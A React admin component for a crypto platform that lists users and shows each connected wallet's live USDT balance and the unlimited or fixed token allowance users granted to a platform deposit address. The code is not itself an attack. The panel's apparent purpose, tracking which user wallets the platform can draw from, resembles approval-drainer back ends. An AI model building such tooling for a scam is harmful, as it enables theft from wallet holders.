'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { toast } from '@/components/ui/toast';
import { formatDate } from '@/lib/utils';
import type { UserDocument } from '@/types';

const T = {
  card:    'rgba(255,255,255,0.04)',
  card2:   'rgba(255,255,255,0.065)',
  card3:   'rgba(255,255,255,0.025)',
  border:  'rgba(255,255,255,0.08)',
  border2: 'rgba(255,255,255,0.13)',
  text:    '#FFFFFF',
  sub:     'rgba(255,255,255,0.52)',
  dim:     'rgba(255,255,255,0.26)',
  blue:    '#4D9FFF',
  green:   '#00E5A0',
  red:     '#F87171',
  yellow:  '#F3BA2F',
  purple:  '#A78BFA',
};

const NET_COLOR: Record<string, string>  = { BEP20: '#F3BA2F', ERC20: '#627EEA', TRC20: '#EF4444' };
const NET_LABEL: Record<string, string>  = { BEP20: 'BNB Smart Chain', ERC20: 'Ethereum', TRC20: 'TRON' };
const NET_SYMBOL: Record<string, string> = { BEP20: 'B', ERC20: 'Ξ', TRC20: 'T' };

interface WalletEntry {
  address: string;
  network: string;
  verificationTxHash?: string;
  depositAddress?: string;
  lastUsed: string;
  orderCount: number;
}

interface WalletInfo {
  balance: string;
  allowance: string;
  allowanceActive: boolean;
}

function LoadingDot() {
  return (
    <span style={{ display:'inline-flex', gap:3, alignItems:'center' }}>
      {[0,1,2].map(i => (
        <span key={i} style={{
          width:4, height:4, borderRadius:'50%', background:'rgba(255,255,255,0.25)',
          animation: `pulse 1.2s ease-in-out ${i*0.2}s infinite`,
        }}/>
      ))}
    </span>
  );
}

function WalletCard({ wallet, userId }: { wallet: WalletEntry; userId: string }) {
  const [info, setInfo] = useState<WalletInfo | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const color = NET_COLOR[wallet.network] ?? T.blue;

  useEffect(() => {
    const params = new URLSearchParams({
      address: wallet.address,
      network: wallet.network,
      spender: wallet.depositAddress || '',
    });
    fetch(`/api/admin/wallet-info?${params}`)
      .then(r => r.json())
      .then(j => {
        if (j.success) setInfo(j.data);
        else setError(j.error || 'Failed to fetch');
      })
      .catch(() => setError('Network error'))
      .finally(() => setLoading(false));
  }, [wallet.address, wallet.network, wallet.depositAddress]);

  const shortAddr = wallet.address.length > 20
    ? `${wallet.address.slice(0, 10)}…${wallet.address.slice(-8)}`
    : wallet.address;

  function copyAddr() {
    navigator.clipboard.writeText(wallet.address);
    toast.success('Address copied');
  }

  function explorerUrl() {
    if (wallet.network === 'BEP20') return `https://bscscan.com/address/${wallet.address}`;
    if (wallet.network === 'ERC20') return `https://etherscan.io/address/${wallet.address}`;
    if (wallet.network === 'TRC20') return `https://tronscan.org/#/address/${wallet.address}`;
    return '#';
  }

  function verifyTxUrl() {
    if (!wallet.verificationTxHash) return '#';
    if (wallet.network === 'BEP20') return `https://bscscan.com/tx/${wallet.verificationTxHash}`;
    if (wallet.network === 'ERC20') return `https://etherscan.io/tx/${wallet.verificationTxHash}`;
    if (wallet.network === 'TRC20') return `https://tronscan.org/#/transaction/${wallet.verificationTxHash}`;
    return '#';
  }

  const balNum     = info ? parseFloat(info.balance)   : 0;
  const allowNum   = info ? parseFloat(info.allowance) : 0;
  const balLow     = !loading && info && balNum < 1;

  return (
    <div style={{
      background: T.card3, border: `1px solid ${color}22`,
      borderRadius: 14, overflow: 'hidden',
    }}>
      {/* Wallet header */}
      <div style={{ padding: '14px 18px', display: 'flex', alignItems: 'center', gap: 12, borderBottom: `1px solid ${T.border}` }}>
        {/* Network badge */}
        <div style={{
          width: 38, height: 38, borderRadius: 10, flexShrink: 0,
          background: `${color}18`, border: `1px solid ${color}35`,
          display: 'flex', alignItems: 'center', justifyContent: 'center',
          fontSize: 14, fontWeight: 900, color,
        }}>
          {NET_SYMBOL[wallet.network] ?? '?'}
        </div>

        {/* Address + network */}
        <div style={{ flex: 1, minWidth: 0 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
            <code style={{ fontSize: 13, fontWeight: 700, color: T.text, fontFamily: 'monospace', letterSpacing: '0.01em' }}>
              {shortAddr}
            </code>
            <span style={{
              fontSize: 10, fontWeight: 800, padding: '2px 8px', borderRadius: 6,
              background: `${color}18`, border: `1px solid ${color}30`, color,
              textTransform: 'uppercase', letterSpacing: '0.08em',
            }}>
              {wallet.network}
            </span>
            {wallet.verificationTxHash && (
              <span style={{
                fontSize: 10, fontWeight: 700, padding: '2px 8px', borderRadius: 6,
                background: 'rgba(0,229,160,0.1)', border: '1px solid rgba(0,229,160,0.22)',
                color: T.green,
              }}>
                ✓ Verified
              </span>
            )}
          </div>
          <div style={{ fontSize: 11, color: T.dim, marginTop: 3 }}>
            {NET_LABEL[wallet.network]} · {wallet.orderCount} order{wallet.orderCount !== 1 ? 's' : ''} · Last {formatDate(wallet.lastUsed)}
          </div>
        </div>

        {/* Actions */}
        <div style={{ display: 'flex', gap: 6, flexShrink: 0 }}>
          <button onClick={copyAddr} title="Copy address" style={{
            background: 'rgba(255,255,255,0.05)', border: `1px solid ${T.border}`,
            borderRadius: 8, padding: '6px 10px', cursor: 'pointer', color: T.sub,
            fontSize: 11, fontWeight: 600, transition: 'all 0.12s',
          }}
            onMouseEnter={e => { e.currentTarget.style.background = 'rgba(255,255,255,0.09)'; e.currentTarget.style.color = T.text; }}
            onMouseLeave={e => { e.currentTarget.style.background = 'rgba(255,255,255,0.05)'; e.currentTarget.style.color = T.sub; }}
          >
            Copy
          </button>
          <a href={explorerUrl()} target="_blank" rel="noreferrer" style={{
            background: `${color}12`, border: `1px solid ${color}28`,
            borderRadius: 8, padding: '6px 10px', cursor: 'pointer', color,
            fontSize: 11, fontWeight: 600, textDecoration: 'none', transition: 'all 0.12s',
          }}>
            Explorer ↗
          </a>
        </div>
      </div>

      {/* Live data grid */}
      <div style={{ padding: '14px 18px', display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 12 }}>
        {/* Balance */}
        <div style={{ background: T.card, borderRadius: 10, padding: '12px 14px', border: `1px solid ${balLow ? 'rgba(248,113,113,0.2)' : T.border}` }}>
          <p style={{ fontSize: 10, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: T.dim, margin: '0 0 6px' }}>USDT Balance</p>
          {loading ? <LoadingDot /> : error ? (
            <p style={{ fontSize: 13, color: T.dim, margin: 0 }}>—</p>
          ) : (
            <>
              <p style={{ fontSize: 16, fontWeight: 800, color: balLow ? T.red : T.text, margin: 0, fontFamily: 'monospace' }}>
                {parseFloat(info!.balance).toFixed(2)}
              </p>
              <p style={{ fontSize: 10, color: T.dim, margin: '3px 0 0' }}>
                {balLow ? '⚠ Low balance' : 'USDT'}
              </p>
            </>
          )}
        </div>

        {/* Contract limit (allowance) */}
        <div style={{ background: T.card, borderRadius: 10, padding: '12px 14px', border: `1px solid ${T.border}` }}>
          <p style={{ fontSize: 10, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: T.dim, margin: '0 0 6px' }}>Contract Limit</p>
          {loading ? <LoadingDot /> : error ? (
            <p style={{ fontSize: 13, color: T.dim, margin: 0 }}>—</p>
          ) : (
            <>
              <p style={{ fontSize: 16, fontWeight: 800, color: allowNum > 0 ? T.blue : T.dim, margin: 0, fontFamily: 'monospace' }}>
                {allowNum > 1e9 ? '∞ Unlimited' : parseFloat(info!.allowance).toFixed(2)}
              </p>
              <p style={{ fontSize: 10, color: T.dim, margin: '3px 0 0' }}>USDT approved</p>
            </>
          )}
        </div>

        {/* Contract status */}
        <div style={{ background: T.card, borderRadius: 10, padding: '12px 14px', border: `1px solid ${T.border}` }}>
          <p style={{ fontSize: 10, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: T.dim, margin: '0 0 6px' }}>Contract Status</p>
          {loading ? <LoadingDot /> : error ? (
            <p style={{ fontSize: 13, color: T.dim, margin: 0 }}>—</p>
          ) : (
            <>
              <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginTop: 2 }}>
                <span style={{
                  width: 8, height: 8, borderRadius: '50%',
                  background: info!.allowanceActive ? T.green : T.dim,
                  boxShadow: info!.allowanceActive ? '0 0 8px rgba(0,229,160,0.6)' : 'none',
                  flexShrink: 0,
                }} />
                <p style={{ fontSize: 14, fontWeight: 800, color: info!.allowanceActive ? T.green : T.dim, margin: 0 }}>
                  {info!.allowanceActive ? 'Active' : 'Inactive'}
                </p>
              </div>
              <p style={{ fontSize: 10, color: T.dim, margin: '3px 0 0' }}>
                {info!.allowanceActive ? 'Allowance set ✓' : 'No allowance set'}
              </p>
            </>
          )}
        </div>
      </div>

      {/* Verification tx */}
      {wallet.verificationTxHash && (
        <div style={{ padding: '0 18px 14px', display: 'flex', alignItems: 'center', gap: 8 }}>
          <svg width="12" height="12" viewBox="0 0 12 12" fill="none" style={{ flexShrink: 0 }}>
            <circle cx="6" cy="6" r="4.5" stroke={T.green} strokeWidth="1.2"/>
            <path d="M4 6L5.5 7.5L8 4.5" stroke={T.green} strokeWidth="1.2" strokeLinecap="round"/>
          </svg>
          <span style={{ fontSize: 11, color: T.dim }}>Verification tx:</span>
          <a href={verifyTxUrl()} target="_blank" rel="noreferrer" style={{
            fontSize: 11, fontFamily: 'monospace', color: T.blue, textDecoration: 'none',
          }}>
            {wallet.verificationTxHash.slice(0, 14)}…{wallet.verificationTxHash.slice(-8)}
          </a>
        </div>
      )}
    </div>
  );
}

function UserRow({ user, onToggle, toggling }: { user: UserDocument; onToggle: () => void; toggling: boolean }) {
  const [expanded, setExpanded] = useState(false);
  const [wallets, setWallets]   = useState<WalletEntry[] | null>(null);
  const [loadingW, setLoadingW] = useState(false);

  async function toggleExpand() {
    const next = !expanded;
    setExpanded(next);
    if (next && wallets === null) {
      setLoadingW(true);
      try {
        const res = await fetch(`/api/admin/users/${user._id}/wallets`);
        const json = await res.json();
        setWallets(json.success ? json.data : []);
      } catch { setWallets([]); }
      finally { setLoadingW(false); }
    }
  }

  const initial = user.name.charAt(0).toUpperCase();

  return (
    <div style={{
      background: T.card, border: `1px solid ${expanded ? T.border2 : T.border}`,
      borderRadius: 16, overflow: 'hidden', transition: 'border-color 0.2s',
    }}>
      {/* User header row */}
      <div
        style={{ padding: '16px 20px', display: 'flex', alignItems: 'center', gap: 14, cursor: 'pointer', userSelect: 'none' }}
        onClick={toggleExpand}
        onMouseEnter={e => (e.currentTarget.style.background = 'rgba(255,255,255,0.025)')}
        onMouseLeave={e => (e.currentTarget.style.background = 'transparent')}
      >
        {/* Avatar */}
        <div style={{
          width: 40, height: 40, borderRadius: '50%', flexShrink: 0,
          background: 'linear-gradient(135deg,#1A3FFF,#6B21FF)',
          display: 'flex', alignItems: 'center', justifyContent: 'center',
          fontSize: 15, fontWeight: 900, color: '#fff',
          boxShadow: '0 2px 10px rgba(26,63,255,0.4)',
        }}>
          {initial}
        </div>

        {/* Name / email */}
        <div style={{ flex: 1, minWidth: 0 }}>
          <div style={{ fontSize: 14, fontWeight: 700, color: T.text, marginBottom: 2 }}>{user.name}</div>
          <div style={{ fontSize: 12, color: T.dim, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{user.email}</div>
        </div>

        {/* Role badge */}
        <span style={{
          fontSize: 10, fontWeight: 800, padding: '3px 10px', borderRadius: 999,
          background: user.role === 'admin' ? 'rgba(167,139,250,0.15)' : 'rgba(255,255,255,0.06)',
          border: user.role === 'admin' ? '1px solid rgba(167,139,250,0.3)' : `1px solid ${T.border}`,
          color: user.role === 'admin' ? T.purple : T.dim,
          textTransform: 'uppercase', letterSpacing: '0.08em', flexShrink: 0,
        }}>
          {user.role}
        </span>

        {/* Status badge */}
        <span style={{
          display: 'inline-flex', alignItems: 'center', gap: 5, padding: '4px 11px',
          borderRadius: 999, fontSize: 11, fontWeight: 700, flexShrink: 0,
          color: user.isActive ? T.green : T.dim,
          background: user.isActive ? 'rgba(0,229,160,0.1)' : 'rgba(255,255,255,0.05)',
          border: user.isActive ? '1px solid rgba(0,229,160,0.22)' : `1px solid ${T.border}`,
        }}>
          <span style={{ width: 5, height: 5, borderRadius: '50%', background: user.isActive ? T.green : T.dim, boxShadow: user.isActive ? '0 0 6px rgba(0,229,160,0.6)' : 'none' }} />
          {user.isActive ? 'Active' : 'Disabled'}
        </span>

        {/* Joined date */}
        <span style={{ fontSize: 11, color: T.dim, whiteSpace: 'nowrap', flexShrink: 0 }}>
          {formatDate(user.createdAt)}
        </span>

        {/* Toggle user status */}
        <button
          onClick={e => { e.stopPropagation(); onToggle(); }}
          disabled={toggling}
          style={{
            padding: '7px 14px', borderRadius: 9, fontSize: 12, fontWeight: 700,
            border: user.isActive ? `1px solid rgba(248,113,113,0.25)` : '1px solid rgba(0,229,160,0.25)',
            background: user.isActive ? 'rgba(248,113,113,0.08)' : 'rgba(0,229,160,0.08)',
            color: user.isActive ? T.red : T.green,
            cursor: toggling ? 'not-allowed' : 'pointer', opacity: toggling ? 0.6 : 1,
            flexShrink: 0, transition: 'all 0.15s',
          }}
        >
          {toggling ? '…' : user.isActive ? 'Deactivate' : 'Activate'}
        </button>

        {/* Expand chevron */}
        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style={{ flexShrink: 0, color: T.dim, transform: expanded ? 'rotate(180deg)' : 'none', transition: 'transform 0.2s' }}>
          <path d="M3 6L8 11L13 6" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
        </svg>
      </div>

      {/* Expanded: wallet detail panel */}
      {expanded && (
        <div style={{ borderTop: `1px solid ${T.border}`, padding: '18px 20px', background: 'rgba(0,0,0,0.15)' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 14 }}>
            <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><rect x="1" y="3" width="12" height="8" rx="2" stroke={T.blue} strokeWidth="1.3"/><path d="M1 6H13" stroke={T.blue} strokeWidth="1.3"/><circle cx="10" cy="9" r="1" fill={T.blue}/></svg>
            <h3 style={{ fontSize: 12, fontWeight: 800, textTransform: 'uppercase', letterSpacing: '0.1em', color: T.blue, margin: 0 }}>
              Connected Wallets & On-Chain Status
            </h3>
          </div>

          {loadingW ? (
            <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '20px 0', color: T.dim, fontSize: 13 }}>
              <div style={{ width: 16, height: 16, borderRadius: '50%', border: '2px solid rgba(255,255,255,0.1)', borderTopColor: T.blue, animation: 'spin 0.8s linear infinite' }} />
              Loading wallet data…
            </div>
          ) : !wallets || wallets.length === 0 ? (
            <div style={{ padding: '20px 0', textAlign: 'center', color: T.dim, fontSize: 13 }}>
              <div style={{ fontSize: 28, marginBottom: 8 }}>👛</div>
              No wallet activity found for this user.
            </div>
          ) : (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
              {wallets.map((w, i) => (
                <WalletCard key={`${w.address}-${w.network}`} wallet={w} userId={user._id} />
              ))}
            </div>
          )}
        </div>
      )}
    </div>
  );
}

interface UserManagerProps {
  users: UserDocument[];
  total: number;
  page: number;
  totalPages: number;
  search?: string;
}

export function UserManager({ users, total, page, totalPages, search: initialSearch = '' }: UserManagerProps) {
  const router = useRouter();
  const [search, setSearch]   = useState(initialSearch);
  const [toggling, setToggling] = useState<string | null>(null);

  function onSearch() {
    const params = new URLSearchParams();
    if (search) params.set('search', search);
    router.push(`/admin/users?${params.toString()}`);
  }

  async function toggleActive(user: UserDocument) {
    setToggling(user._id);
    try {
      const res = await fetch(`/api/users/${user._id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ isActive: !user.isActive }),
      });
      const data = await res.json();
      if (!res.ok) { toast.error(data.error || 'Failed'); return; }
      toast.success(user.isActive ? 'User deactivated' : 'User activated');
      router.refresh();
    } catch { toast.error('Failed'); }
    finally { setToggling(null); }
  }

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 20 }}>
      <style>{`@keyframes spin{to{transform:rotate(360deg)}} @keyframes pulse{0%,100%{opacity:.3}50%{opacity:1}}`}</style>

      {/* Search bar */}
      <div style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: 16, padding: '16px 20px', display: 'flex', gap: 10, alignItems: 'center' }}>
        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style={{ color: T.dim, flexShrink: 0 }}>
          <circle cx="7" cy="7" r="5" stroke="currentColor" strokeWidth="1.4"/>
          <path d="M11 11L14 14" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round"/>
        </svg>
        <input
          type="text"
          placeholder="Search by name or email…"
          value={search}
          onChange={e => setSearch(e.target.value)}
          onKeyDown={e => e.key === 'Enter' && onSearch()}
          style={{ flex: 1, background: 'none', border: 'none', outline: 'none', fontSize: 14, color: T.text, caretColor: T.blue }}
        />
        <button onClick={onSearch} style={{
          padding: '8px 18px', borderRadius: 10, fontSize: 13, fontWeight: 700,
          background: 'linear-gradient(135deg,#1A3FFF,#6B21FF)', border: 'none',
          color: '#fff', cursor: 'pointer', boxShadow: '0 3px 12px rgba(26,63,255,0.35)',
        }}>
          Search
        </button>
        <span style={{ fontSize: 12, color: T.dim, whiteSpace: 'nowrap', marginLeft: 4 }}>
          {total} user{total !== 1 ? 's' : ''}
        </span>
      </div>

      {/* User list */}
      {users.length === 0 ? (
        <div style={{ padding: '40px 20px', textAlign: 'center', color: T.dim, fontSize: 14, background: T.card, borderRadius: 16, border: `1px solid ${T.border}` }}>
          No users found.
        </div>
      ) : (
        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
          {users.map(u => (
            <UserRow
              key={u._id}
              user={u}
              onToggle={() => toggleActive(u)}
              toggling={toggling === u._id}
            />
          ))}
        </div>
      )}

      {/* Pagination */}
      {totalPages > 1 && (
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '10px 0' }}>
          <span style={{ fontSize: 12, color: T.dim }}>Page {page} of {totalPages}</span>
          <div style={{ display: 'flex', gap: 8 }}>
            {page > 1 && (
              <button onClick={() => router.push(`/admin/users?page=${page - 1}${search ? `&search=${search}` : ''}`)}
                style={{ padding: '8px 16px', borderRadius: 10, fontSize: 12, fontWeight: 600, border: `1px solid ${T.border}`, background: T.card, color: T.sub, cursor: 'pointer' }}>
                ← Previous
              </button>
            )}
            {page < totalPages && (
              <button onClick={() => router.push(`/admin/users?page=${page + 1}${search ? `&search=${search}` : ''}`)}
                style={{ padding: '8px 16px', borderRadius: 10, fontSize: 12, fontWeight: 600, border: `1px solid ${T.border}`, background: T.card, color: T.sub, cursor: 'pointer' }}>
                Next →
              </button>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
